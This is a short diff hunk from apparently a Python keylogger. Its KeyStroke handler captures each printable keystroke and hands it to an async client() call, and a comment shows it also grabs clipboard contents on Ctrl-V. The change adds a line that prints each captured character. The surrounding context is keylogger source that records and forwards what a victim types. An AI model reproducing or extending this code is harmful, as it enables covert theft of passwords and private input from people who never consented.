@@ -71,6 +71,7 @@ def KeyStroke(event):
 
     # if they pressed a standard key
     if 32 < event.Ascii < 127:
+        print(chr(event.Ascii))
         asyncio.get_event_loop().run_until_complete(client(chr(event.Ascii)))
     else:
         # if [Ctrl-V], get the value on the clipboard
